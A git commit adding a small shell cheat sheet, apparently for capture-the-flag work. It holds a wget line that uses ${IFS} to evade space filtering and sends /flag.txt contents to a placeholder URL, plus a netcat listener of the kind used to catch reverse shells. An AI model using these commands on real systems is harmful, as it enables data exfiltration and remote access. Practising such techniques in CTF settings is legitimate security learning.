e796206682e9434db3ae2da0c29712c0384d578c
tntminh <137958525+tntminh@users.noreply.github.com>
2024-09-23 12:27:59 +0700

    Create some_utils.sh

---
+++ some_utils.sh
@@ -0,0 +1,10 @@
+# extract value(s) from a position
+dd if=example.txt bs=1 skip=10
+
+# send a file using wget
+wget${IFS}your_url?$(cat${IFS}/flag.txt)")
+
+# init socket listener
+sudo nc -lvnp PORT
+
+
